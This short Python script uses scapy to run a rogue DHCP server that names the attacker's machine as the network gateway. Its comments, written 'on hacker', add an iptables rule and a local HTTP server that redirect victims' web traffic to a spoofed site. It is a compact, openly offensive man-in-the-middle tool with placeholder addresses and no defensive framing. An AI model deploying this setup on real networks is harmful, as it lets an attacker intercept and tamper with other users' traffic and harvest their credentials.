from scapy.all import DHCP_am
from scapy.base_classes import Net

#to spoof an http serv :
#
#on hacker:
#
#iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 6673
#
#and 
#
#python3 -m http.server 6673

OurNetwork = 'X.X.X.X'
AttackerNet = 'X.X.X.X'

dhcp_server = DHCP_am(iface='eth1',
                      pool=Net(OurNetwork),
                      network=OurNetwork,
                      gw=AttackerNet,
                      renewal_time=600, lease_time=3600)
dhcp_server()
